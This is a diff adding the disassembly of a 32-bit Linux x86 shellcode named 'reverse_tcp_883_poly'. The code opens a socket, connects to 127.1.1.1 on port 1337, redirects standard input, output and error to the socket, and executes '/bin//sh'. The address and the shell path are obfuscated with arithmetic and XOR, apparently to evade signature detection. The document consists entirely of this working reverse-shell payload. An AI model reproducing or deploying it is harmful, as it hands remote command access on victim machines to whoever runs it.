@@ -1,0 +1,59 @@
+
+reverse_tcp_883_poly:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048080 <_start>:
+ 8048080:	31 db                	xor    ebx,ebx
+ 8048082:	f7 e3                	mul    ebx
+ 8048084:	b0 66                	mov    al,0x66
+ 8048086:	43                   	inc    ebx
+ 8048087:	52                   	push   edx
+ 8048088:	53                   	push   ebx
+ 8048089:	6a 02                	push   0x2
+ 804808b:	89 e1                	mov    ecx,esp
+ 804808d:	cd 80                	int    0x80
+ 804808f:	92                   	xchg   edx,eax
+ 8048090:	83 c0 66             	add    eax,0x66
+ 8048093:	be ff ff ff ff       	mov    esi,0xffffffff
+ 8048098:	81 ee fe fe fe 80    	sub    esi,0x80fefefe
+ 804809e:	0f ce                	bswap  esi
+ 80480a0:	56                   	push   esi
+ 80480a1:	66 68 05 39          	pushw  0x3905
+ 80480a5:	83 c3 01             	add    ebx,0x1
+ 80480a8:	66 53                	push   bx
+ 80480aa:	89 e1                	mov    ecx,esp
+ 80480ac:	c1 c3 03             	rol    ebx,0x3
+ 80480af:	53                   	push   ebx
+ 80480b0:	83 eb 0d             	sub    ebx,0xd
+ 80480b3:	51                   	push   ecx
+ 80480b4:	52                   	push   edx
+ 80480b5:	89 e1                	mov    ecx,esp
+ 80480b7:	cd 80                	int    0x80
+ 80480b9:	31 c9                	xor    ecx,ecx
+ 80480bb:	83 c1 02             	add    ecx,0x2
+ 80480be:	89 d3                	mov    ebx,edx
+
+080480c0 <loop>:
+ 80480c0:	b0 40                	mov    al,0x40
+ 80480c2:	fe c8                	dec    al
+ 80480c4:	cd 80                	int    0x80
+ 80480c6:	49                   	dec    ecx
+ 80480c7:	79 f7                	jns    80480c0 <loop>
+ 80480c9:	31 db                	xor    ebx,ebx
+ 80480cb:	f7 e3                	mul    ebx
+ 80480cd:	b0 35                	mov    al,0x35
+ 80480cf:	41                   	inc    ecx
+ 80480d0:	2c 2a                	sub    al,0x2a
+ 80480d2:	52                   	push   edx
+ 80480d3:	ba 2d 2c 2b 2a       	mov    edx,0x2a2b2c2d
+ 80480d8:	bb 02 03 58 42       	mov    ebx,0x42580302
+ 80480dd:	31 d3                	xor    ebx,edx
+ 80480df:	53                   	push   ebx
+ 80480e0:	bb 02 4e 42 44       	mov    ebx,0x44424e02
+ 80480e5:	31 d3                	xor    ebx,edx
+ 80480e7:	53                   	push   ebx
+ 80480e8:	89 e3                	mov    ebx,esp
+ 80480ea:	29 d2                	sub    edx,edx
+ 80480ec:	cd 80                	int    0x80
